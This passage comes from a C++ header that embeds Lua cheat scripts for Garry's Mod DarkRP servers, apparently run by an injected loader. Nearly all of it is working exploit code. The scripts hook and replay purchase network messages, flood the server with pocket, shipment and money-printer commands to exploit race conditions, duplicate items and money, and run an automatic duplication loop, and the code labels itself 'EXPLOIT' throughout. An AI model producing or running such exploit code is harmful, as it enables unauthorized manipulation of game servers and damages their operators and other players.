                name = _fdll_dupe_currentMsg.name,
                ops = _fdll_dupe_currentMsg.ops,
                time = CurTime(),
                isBuy = isBuy
            }
            table.insert(_fdll_dupe_captured, entry)
            if #_fdll_dupe_captured > 50 then table.remove(_fdll_dupe_captured, 1) end
            if isBuy then _fdll_dupe_last_buy = entry end
            _fdll_dupe_currentMsg = nil
        end
        return _fdll_dupe_origSend(...)
    end
    chat.AddText(Color(0,255,255), "[DUPE] ", Color(255,255,255), "Net capture active. Buy something to capture the message.")
end)
)lua";

inline const char* LUA_DUPE_NET_BURST_FIRE = R"lua(
local r = ""
pcall(function()
    if not _fdll_dupe_last_buy then
        r = "No buy message captured yet. Buy something first!"
        return
    end
    local msg = _fdll_dupe_last_buy
    local count = %d
    local delay = %f
    r = "Bursting: "..msg.name.." x"..count.." (delay="..delay.."s)\n"
    r = r.."Ops per message: "..#msg.ops.."\n"

    local origStart = _fdll_dupe_origStart
    local origSend  = _fdll_dupe_origSend
    local origWrites = _fdll_dupe_origWrites

    for i = 1, count do
        timer.Simple(delay * (i - 1), function()
            pcall(function()
                origStart(msg.name)
                for _, op in ipairs(msg.ops) do
                    local fn = origWrites[op.fn] or net[op.fn]
                    if fn then fn(unpack(op.args)) end
                end
                origSend()
            end)
        end)
    end
    r = r.."Sent "..count.." replays of '"..msg.name.."'\n"
    chat.AddText(Color(255,50,50), "[DUPE] ", Color(255,255,0), "Burst fired: "..msg.name.." x"..count)
end)
return r
)lua";

inline const char* LUA_DUPE_NET_BURST_STATUS = R"lua(
local r = ""
pcall(function()
    if not _fdll_dupe_captured then r = "Not capturing" return end
    r = "=== DUPE CAPTURE STATUS ===\n"
    r = r.."Captured messages: "..#_fdll_dupe_captured.."\n"
    if _fdll_dupe_last_buy then
        r = r.."Last buy: "..(_fdll_dupe_last_buy.name).." ("..#_fdll_dupe_last_buy.ops.." ops)\n"
        r = r.."Ops:\n"
        for i, op in ipairs(_fdll_dupe_last_buy.ops) do
            local argStr = ""
            for _, a in ipairs(op.args) do argStr = argStr..tostring(a).." " end
            r = r.."  "..i..". "..op.fn.."("..argStr..")\n"
        end
    else
        r = r.."No buy message captured yet\n"
    end
    r = r.."\nAll captured (last 20):\n"
    local start = math.max(1, #_fdll_dupe_captured - 19)
    for i = start, #_fdll_dupe_captured do
        local e = _fdll_dupe_captured[i]
        r = r..string.format("  %s%s (%d ops)\n",
            e.isBuy and "[BUY] " or "", e.name, #e.ops)
    end
end)
return r
)lua";

inline const char* LUA_DUPE_NET_BURST_STOP = R"lua(
pcall(function()
    if _fdll_dupe_origStart then net.Start = _fdll_dupe_origStart end
    if _fdll_dupe_origSend then net.SendToServer = _fdll_dupe_origSend end
    for fn, orig in pairs(_fdll_dupe_origWrites or {}) do
        net[fn] = orig
    end
    _fdll_dupe_capture = false
    chat.AddText(Color(0,255,255), "[DUPE] ", Color(255,255,255), "Net capture stopped.")
end)
)lua";

// -----------------------------------------------------------------------
// 136. Pocket Dupe -- exploit pocket save/load timing
// -----------------------------------------------------------------------
inline const char* LUA_DUPE_POCKET = R"lua(
local r = ""
pcall(function()
    local lp = LocalPlayer()
    if not IsValid(lp) or not lp:Alive() then r = "Not alive" return end

    r = "=== POCKET DUPE EXPLOIT ===\n"
    local tr = lp:GetEyeTrace()
    if not IsValid(tr.Entity) then r = r.."Look at an entity first!\n" return end
    local target = tr.Entity
    local eid = target:EntIndex()
    local cls = target:GetClass()
    r = r.."Target: "..cls.." ["..eid.."]\n"

    -- Method 1: Rapid pocket + unpocket cycle
    -- Pocket the entity, immediately drop it, then re-pocket before server processes
    r = r.."\n[Method 1: Rapid Pocket Cycle]\n"
    pcall(function()
        for i = 1, 5 do
            timer.Simple(0.0 + (i-1) * 0.05, function()
                RunConsoleCommand("darkrp", "pocket", tostring(eid))
            end)
        end
        -- Drop between pockets
        timer.Simple(0.025, function()
            RunConsoleCommand("darkrp", "pocketdrop", "0")
        end)
        timer.Simple(0.075, function()
            RunConsoleCommand("darkrp", "pocketdrop", "0")
        end)
    end)
    r = r.."Sent 5 pocket + 2 drop commands\n"

    -- Method 2: Pocket + use simultaneously
    r = r.."\n[Method 2: Pocket + Use Race]\n"
    pcall(function()
        RunConsoleCommand("darkrp", "pocket", tostring(eid))
        RunConsoleCommand("+use")
        timer.Simple(0.01, function()
            RunConsoleCommand("-use")
            RunConsoleCommand("darkrp", "pocket", tostring(eid))
        end)
    end)
    r = r.."Sent pocket+use race condition\n"

    -- Method 3: Pocket all indexed by entity
    r = r.."\n[Method 3: Multi-pocket by index]\n"
    pcall(function()
        for i = 0, 3 do
            timer.Simple(i * 0.02, function()
                RunConsoleCommand("darkrp", "pocket", tostring(eid))
            end)
        end
    end)
    r = r.."Sent 4 rapid pocket requests for entity "..eid.."\n"

    r = r.."\nCheck your pocket with /pocket - items may be duplicated.\n"
end)
return r
)lua";

// -----------------------------------------------------------------------
// 137. Shipment Rapid Extract -- race condition weapon extraction
// -----------------------------------------------------------------------
inline const char* LUA_DUPE_SHIPMENT = R"lua(
local r = ""
pcall(function()
    local lp = LocalPlayer()
    if not IsValid(lp) or not lp:Alive() then r = "Not alive" return end

    r = "=== SHIPMENT EXTRACTION EXPLOIT ===\n"

    -- Find nearest shipment
    local nearest, ndist = nil, math.huge
    for _, e in ipairs(ents.GetAll()) do
        local cls = string.lower(e:GetClass())
        if (string.find(cls, "shipment") or string.find(cls, "crate")) and e:GetPos():Distance(lp:GetPos()) < ndist then
            nearest = e
            ndist = e:GetPos():Distance(lp:GetPos())
        end
    end
    if not nearest then r = r.."No shipments found nearby\n" return end

    local eid = nearest:EntIndex()
    local cls = nearest:GetClass()
    r = r.."Target: "..cls.." ["..eid.."] dist="..math.floor(ndist).."\n"

    -- Get the item count if possible
    local count = -1
    pcall(function() count = nearest:GetNWInt("count", -1) end)
    pcall(function() if count < 0 then count = nearest:GetNWInt("amount", -1) end end)
    r = r.."Items in shipment: "..tostring(count).."\n"

    -- Method 1: Rapid +use on the shipment (extract weapons faster than server updates count)
    r = r.."\n[Method 1: Rapid USE extraction]\n"
    local burstCount = 20
    for i = 0, burstCount - 1 do
        timer.Simple(i * 0.015, function()
            -- Look at shipment and use
            lp:SetEyeAngles((nearest:GetPos() + Vector(0,0,10) - lp:EyePos()):Angle())
            RunConsoleCommand("+use")
            timer.Simple(0.005, function() RunConsoleCommand("-use") end)
        end)
    end
    r = r.."Sent "..burstCount.." rapid USE commands (15ms apart)\n"

    -- Method 2: Net message for shipment take (many servers use a net message)
    r = r.."\n[Method 2: Net message extraction]\n"
    local takeNets = {}
    if net.Receivers then
        for name in pairs(net.Receivers) do
            local low = string.lower(name)
            if string.find(low, "take") or string.find(low, "shipment") or string.find(low, "extract") then
                table.insert(takeNets, name)
            end
        end
    end
    for _, netName in ipairs(takeNets) do
        r = r.."Found: "..netName.."\n"
        local origStart = _fdll_dupe_origStart or net.Start
        local origSend = _fdll_dupe_origSend or net.SendToServer
        for i = 0, 9 do
            timer.Simple(i * 0.02, function()
                pcall(function()
                    origStart(netName)
                    net.WriteEntity(nearest)
                    origSend()
                end)
                pcall(function()
                    origStart(netName)
                    net.WriteInt(eid, 32)
                    origSend()
                end)
            end)
        end
        r = r.."Sent 10 burst extracts via "..netName.."\n"
    end
    if #takeNets == 0 then r = r.."No take net messages found\n" end

    -- Method 3: DarkRP shipment pickup via console
    r = r.."\n[Method 3: Console command burst]\n"
    for i = 0, 14 do
        timer.Simple(i * 0.01, function()
            pcall(function() RunConsoleCommand("darkrp", "takeshipment", tostring(eid)) end)
            pcall(function() RunConsoleCommand("gm_spawn", cls) end)
        end)
    end
    r = r.."Sent 15 takeshipment commands\n"

    r = r.."\nWeapons should be spawning rapidly. Pick them up!\n"
end)
return r
)lua";

// -----------------------------------------------------------------------
// 138. Printer Money Multiplier -- rapid collect race condition
// -----------------------------------------------------------------------
inline const char* LUA_DUPE_PRINTER = R"lua(
local r = ""
pcall(function()
    local lp = LocalPlayer()
    if not IsValid(lp) or not lp:Alive() then r = "Not alive" return end

    r = "=== PRINTER MONEY MULTIPLIER ===\n"

    -- Find all printers in range
    local printers = {}
    for _, e in ipairs(ents.GetAll()) do
        local cls = string.lower(e:GetClass())
        if (string.find(cls, "printer") or string.find(cls, "bitcoin") or string.find(cls, "miner"))
            and e:GetPos():Distance(lp:GetPos()) < 200 then
            local money = 0
            pcall(function() money = e:GetNWInt("PrintAmount", 0) end)
            pcall(function() if money == 0 then money = e:GetNWInt("money", 0) end end)
            pcall(function() if money == 0 then money = e:GetNWInt("Amount", 0) end end)
            pcall(function() if money == 0 then money = e.PrintAmount or 0 end end)
            table.insert(printers, {ent=e, cls=cls, money=money, id=e:EntIndex()})
        end
    end
    if #printers == 0 then r = r.."No printers within 200 units\n" return end

    for _, p in ipairs(printers) do
        r = r.."Printer: "..p.cls.." ["..p.id.."] $"..p.money.."\n"

        -- Method 1: Rapid USE on printer (collect money multiple times before it resets)
        for i = 0, 19 do
            timer.Simple(i * 0.01, function()
                pcall(function()
                    lp:SetEyeAngles((p.ent:GetPos() + Vector(0,0,10) - lp:EyePos()):Angle())
                    RunConsoleCommand("+use")
                    timer.Simple(0.003, function() RunConsoleCommand("-use") end)
                end)
            end)
        end
        r = r.."  Sent 20 rapid USE (10ms apart)\n"

        -- Method 2: Net message collect spam
        local collectNets = {}
        if net.Receivers then
            for name in pairs(net.Receivers) do
                local low = string.lower(name)
                if string.find(low, "collect") or string.find(low, "printer")
                    or string.find(low, "withdraw") or string.find(low, "harvest") then
                    table.insert(collectNets, name)
                end
            end
        end
        for _, netName in ipairs(collectNets) do
            r = r.."  Found net: "..netName.."\n"
            local origStart = _fdll_dupe_origStart or net.Start
            local origSend = _fdll_dupe_origSend or net.SendToServer
            for i = 0, 9 do
                timer.Simple(i * 0.015, function()
                    pcall(function()
                        origStart(netName)
                        net.WriteEntity(p.ent)
                        origSend()
                    end)
                    pcall(function()
                        origStart(netName)
                        net.WriteInt(p.id, 32)
                        origSend()
                    end)
                end)
            end
            r = r.."  Sent 10 burst collects via "..netName.."\n"
        end

        -- Method 3: Fire input directly
        pcall(function()
            for i = 0, 4 do
                timer.Simple(i * 0.02, function()
                    p.ent:Fire("Use", "", 0)
                end)
            end
        end)
        r = r.."  Sent 5 Fire(Use) inputs\n"
    end
    r = r.."\nCheck your money - it may have multiplied!\n"
end)
return r
)lua";

// -----------------------------------------------------------------------
// 139. Buy Command Burst -- spam buy commands in one tick
// -----------------------------------------------------------------------
inline const char* LUA_DUPE_BUY_BURST_SETUP = R"lua(
pcall(function()
    if _fdll_buyburst then return end
    _fdll_buyburst = true
    _fdll_buyburst_history = {}

    -- Intercept DarkRP buy commands
    local origRunCmd = RunConsoleCommand
    _fdll_origRunCmd = _fdll_origRunCmd or origRunCmd

    hook.Add("OnPlayerChat", "_fdll_buyburst", function(ply, text, isTeam, isDead)
        if ply ~= LocalPlayer() then return end
        local low = string.lower(text)
        if string.sub(low, 1, 1) == "/" then
            for _, kw in ipairs({"buy","purchase","order","buyshipment","buyammo"}) do
                if string.find(low, kw, 1, true) then
                    table.insert(_fdll_buyburst_history, {
                        cmd = text,
                        time = CurTime()
                    })
                    if #_fdll_buyburst_history > 20 then table.remove(_fdll_buyburst_history, 1) end
                    break
                end
            end
        end
    end)
    chat.AddText(Color(0,255,255), "[DUPE] ", Color(255,255,255), "Buy burst active. Buy something to capture, then fire burst.")
end)
)lua";

inline const char* LUA_DUPE_BUY_BURST_FIRE = R"lua(
local r = ""
pcall(function()
    local count = %d
    if not _fdll_buyburst_history or #_fdll_buyburst_history == 0 then
        r = "No buy commands captured. Type a /buy command first."
        return
    end
    local last = _fdll_buyburst_history[#_fdll_buyburst_history]
    r = "Bursting: "..last.cmd.." x"..count.."\n"
    for i = 1, count do
        timer.Simple((i-1) * 0.02, function()
            RunConsoleCommand("say", last.cmd)
        end)
    end
    r = r.."Sent "..count.." buy commands (20ms apart)\n"
    chat.AddText(Color(255,50,50), "[DUPE] ", Color(255,255,0), "Buy burst: "..last.cmd.." x"..count)
end)
return r
)lua";

inline const char* LUA_DUPE_BUY_BURST_STOP = R"lua(
pcall(function()
    hook.Remove("OnPlayerChat", "_fdll_buyburst")
    _fdll_buyburst = false
end)
)lua";

// -----------------------------------------------------------------------
// 140. Duplicator Tool Force -- bypass sandbox restrictions
// -----------------------------------------------------------------------
inline const char* LUA_DUPE_DUPLICATOR = R"lua(
local r = ""
pcall(function()
    local lp = LocalPlayer()
    if not IsValid(lp) or not lp:Alive() then r = "Not alive" return end

    r = "=== DUPLICATOR EXPLOIT ===\n"
    local tr = lp:GetEyeTrace()

    -- Method 1: Try to use duplicator.Copy directly
    r = r.."\n[Method 1: Direct duplicator.Copy]\n"
    pcall(function()
        if not IsValid(tr.Entity) then r = r.."Look at an entity!\n" return end
        local entTable = duplicator.CopyEntTable(tr.Entity)
        if entTable then
            _fdll_dupe_saved_ent = entTable
            _fdll_dupe_saved_class = tr.Entity:GetClass()
            r = r.."Captured: "..tr.Entity:GetClass().." ["..tr.Entity:EntIndex().."]\n"
            r = r.."Keys: "
            for k in pairs(entTable) do r = r..k.." " end
            r = r.."\n"
        end
    end)

    -- Method 2: Try to paste via console
    r = r.."\n[Method 2: Tool commands]\n"
    pcall(function()
        RunConsoleCommand("gmod_tool", "duplicator")
        r = r.."Set tool to duplicator\n"
        RunConsoleCommand("gmod_toolmode", "duplicator")
        r = r.."Right-click entity to copy, left-click to paste\n"
    end)

    -- Method 3: Try undo system to get previously spawned entities re-created
    r = r.."\n[Method 3: Undo abuse]\n"
    pcall(function()
        local undoList = undo.GetTable and undo.GetTable() or {}
        r = r.."Undo entries: "..#undoList.."\n"
        for i = math.max(1, #undoList - 4), #undoList do
            if undoList[i] then
                r = r.."  "..tostring(undoList[i].Name or "?").."\n"
            end
        end
    end)

    -- Method 4: Copy via properties menu
    r = r.."\n[Method 4: Entity copy via properties]\n"
    pcall(function()
        if IsValid(tr.Entity) then
            -- Save all entity data for manual reconstruction
            local data = {
                class = tr.Entity:GetClass(),
                model = tr.Entity:GetModel(),
                pos = tr.Entity:GetPos(),
                ang = tr.Entity:GetAngles(),
                skin = tr.Entity:GetSkin(),
                color = tr.Entity:GetColor(),
                material = tr.Entity:GetMaterial(),
            }
            _fdll_dupe_manual_data = data
            r = r.."Saved entity data for: "..data.class.."\n"
            r = r.."Model: "..(data.model or "none").."\n"
            r = r.."Pos: "..tostring(data.pos).."\n"

            -- Try to spawn a copy via available methods
            RunConsoleCommand("gm_spawn", data.model or data.class)
            RunConsoleCommand("gm_spawnsent", data.class)
            r = r.."Attempted spawn via gm_spawn and gm_spawnsent\n"
        end
    end)

    -- Method 5: Net message spawn (find spawn messages)
    r = r.."\n[Method 5: Net spawn messages]\n"
    local spawnNets = {}
    if net.Receivers then
        for name in pairs(net.Receivers) do
            local low = string.lower(name)
            if string.find(low, "spawn") or string.find(low, "create") or string.find(low, "place") then
                table.insert(spawnNets, name)
            end
        end
    end
    for _, n in ipairs(spawnNets) do r = r.."  Found: "..n.."\n" end
end)
return r
)lua";

// -----------------------------------------------------------------------
// 141. Entity Snapshot & Clone -- deep copy entity for later recreation
// -----------------------------------------------------------------------
inline const char* LUA_DUPE_SNAPSHOT = R"lua(
local r = ""
pcall(function()
    local lp = LocalPlayer()
    if not IsValid(lp) then r = "Invalid" return end
    local tr = lp:GetEyeTrace()
    if not IsValid(tr.Entity) then r = "Look at an entity!" return end
    local ent = tr.Entity
    r = "=== ENTITY SNAPSHOT ===\n"
    r = r.."Class: "..ent:GetClass().."\n"
    r = r.."Model: "..(ent:GetModel() or "none").."\n"
    r = r.."EntIndex: "..ent:EntIndex().."\n"
    r = r.."Pos: "..tostring(ent:GetPos()).."\n"
    r = r.."Ang: "..tostring(ent:GetAngles()).."\n"
    r = r.."Health: "..ent:Health().."/"..ent:GetMaxHealth().."\n"

    -- Deep NW var dump
    r = r.."\nNW Variables:\n"
    pcall(function()
        local nw = ent:GetNWVarTable and ent:GetNWVarTable() or {}
        for k, v in pairs(nw) do
            r = r.."  "..tostring(k).." = "..tostring(v).."\n"
        end
    end)

    -- DT vars
    r = r.."\nDataTable:\n"
    pcall(function()
        for i = 0, 31 do
            pcall(function()
                local v = ent:GetDTInt(i)
                if v and v ~= 0 then r = r.."  DTInt["..i.."] = "..v.."\n" end
            end)
            pcall(function()
                local v = ent:GetDTFloat(i)
                if v and v ~= 0 then r = r.."  DTFloat["..i.."] = "..string.format("%.2f", v).."\n" end
            end)
            pcall(function()
                local v = ent:GetDTBool(i)
                if v then r = r.."  DTBool["..i.."] = true\n" end
            end)
            pcall(function()
                local v = ent:GetDTString(i)
                if v and v ~= "" then r = r.."  DTString["..i.."] = "..v.."\n" end
            end)
        end
    end)

    -- Owner info
    r = r.."\nOwnership:\n"
    pcall(function()
        if ent.CPPIGetOwner then
            local owner = ent:CPPIGetOwner()
            r = r.."  CPPI Owner: "..(IsValid(owner) and owner:Nick() or "none").."\n"
        end
        if ent.Getowning_ent then
            local owner = ent:Getowning_ent()
            r = r.."  DarkRP Owner: "..(IsValid(owner) and owner:Nick() or "none").."\n"
        end
    end)

    -- Store snapshot for buy attempt
    _fdll_dupe_snapshot = {
        class = ent:GetClass(),
        model = ent:GetModel(),
        pos = ent:GetPos(),
        ang = ent:GetAngles(),
    }

    -- Attempt to find buy command for this entity class
    r = r.."\nRecreation attempts:\n"
    pcall(function()
        if DarkRPEntities then
            for _, dent in ipairs(DarkRPEntities) do
                if dent.ent == ent:GetClass() then
                    r = r.."  DarkRP buy cmd: /"..(dent.cmd or "?").." (price: $"..(dent.price or "?")..")\n"
                    _fdll_dupe_snapshot.buyCmd = dent.cmd
                end
            end
        end
    end)
    pcall(function()
        if CustomShipments then
            for _, s in ipairs(CustomShipments) do
                if s.entity == ent:GetClass() then
                    r = r.."  Shipment buy: /buy"..(s.name or "?").." (price: $"..(s.price or "?")..")\n"
                    _fdll_dupe_snapshot.shipmentCmd = "buy"..s.name
                end
            end
        end
    end)

    -- Save to file
    file.CreateDir("fdll_snapshots")
    file.Write("fdll_snapshots/"..string.Replace(ent:GetClass(), "/", "_")..".txt", r)
    r = r.."\n[Saved to garrysmod/data/fdll_snapshots/]\n"
end)
return r
)lua";

// -----------------------------------------------------------------------
// 142. Auto Dupe Loop -- continuously duplicates last captured item
// -----------------------------------------------------------------------
inline const char* LUA_DUPE_AUTO_SETUP = R"lua(
pcall(function()
    if _fdll_autodupe then return end
    _fdll_autodupe = true
    _fdll_autodupe_count = 0

    timer.Create("_fdll_autodupe", %f, 0, function()
        if not _fdll_autodupe then timer.Remove("_fdll_autodupe") return end

        -- Try net burst replay
        if _fdll_dupe_last_buy then
            pcall(function()
                local msg = _fdll_dupe_last_buy
                local origStart = _fdll_dupe_origStart or net.Start
                local origSend = _fdll_dupe_origSend or net.SendToServer
                origStart(msg.name)
                for _, op in ipairs(msg.ops) do
                    local fn = (_fdll_dupe_origWrites or {})[op.fn] or net[op.fn]
                    if fn then fn(unpack(op.args)) end
                end
                origSend()
                _fdll_autodupe_count = _fdll_autodupe_count + 1
            end)
        -- Try buy command replay
        elseif _fdll_buyburst_history and #_fdll_buyburst_history > 0 then
            pcall(function()
                local last = _fdll_buyburst_history[#_fdll_buyburst_history]
                RunConsoleCommand("say", last.cmd)
                _fdll_autodupe_count = _fdll_autodupe_count + 1
            end)
        end
    end)
    chat.AddText(Color(255,50,50), "[DUPE] ", Color(255,255,0), "Auto-dupe loop started")
end)
)lua";

inline const char* LUA_DUPE_AUTO_STOP = R"lua(
pcall(function()
    timer.Remove("_fdll_autodupe")
    _fdll_autodupe = false
    local count = _fdll_autodupe_count or 0
    chat.AddText(Color(0,255,255), "[DUPE] ", Color(255,255,255), "Auto-dupe stopped. Total: "..count.." attempts")
end)
)lua";

} // close namespace for batch includes

#include "darkrp_lua_batch1.hpp"
#include "darkrp_lua_batch2.hpp"
#include "darkrp_lua_batch3.hpp"
#include "darkrp_lua_batch4.hpp"
#include "darkrp_lua_batch5.hpp"
#include "darkrp_lua_batch8.hpp"
#include "exploit_batch_v3.hpp"

namespace luascripts {

	// -----------------------------------------------------------------------
	// 122. Helper functions to run scripts through lualoader
	// -----------------------------------------------------------------------
	inline bool RunLuaScript(const char* script) {
		if (!config::luastate) return false;
		lualoader::QueueRun(std::string(script));
		return true;
	}

	inline void QueryLuaScript(const char* script, std::string* dest) {
		if (!config::luastate) return;
		lualoader::QueueQuery(std::string(script), dest);
	}

	inline std::string QueryLuaScript(const char* script) {
		if (!config::luastate) return "";
		return lualoader::ExecuteAndGetResult(std::string(script));
	}

} // namespace luascripts
